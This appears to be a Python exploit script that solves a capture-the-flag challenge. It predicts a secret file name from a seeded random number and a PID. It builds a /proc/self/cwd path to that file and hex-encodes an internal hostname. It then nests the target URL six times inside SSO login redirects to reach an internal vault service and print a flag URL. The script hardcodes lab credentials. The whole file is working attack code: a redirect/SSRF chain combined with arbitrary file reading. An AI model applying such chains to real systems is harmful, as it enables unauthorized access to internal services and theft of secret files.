import urllib.parse
import hashlib
import random

PID = 21

SSO_USER = "NEMO1337"
SSO_PASS = "NEMO1337"

uid, gid = 0, 0
seed = int(f"{PID}{uid}{gid}")
random.seed(seed)
random_num = random.randint(100000, 999999)
hash_part = hashlib.sha256(str(random_num).encode()).hexdigest()[:16]
secret_filename = f"{hash_part}.txt"
print(f"[+] File name for PID={PID}: {secret_filename}")

NITE_USER = "qwertyuiop"
NITE_PASS = "SgYJBS9C1b1ohbazlE"

hostname = "nite-vault"
encoded_hostname = "".join([f"%{c:02x}" for c in hostname.encode()])

path_via_procfs = f"/proc/self/cwd/secrets/{secret_filename}"

target_url = f"http://{encoded_hostname}/view?file={path_via_procfs}&username={NITE_USER}&password={NITE_PASS}#"

sso_redirect_base = f"http://nite-sso/doLogin?username={SSO_USER}&password={SSO_PASS}&redirect_url="
final_payload = target_url
for _ in range(6):
  final_payload = sso_redirect_base + urllib.parse.quote_plus(final_payload)

print("\nURL TO GET THE FLAG")
print(final_payload)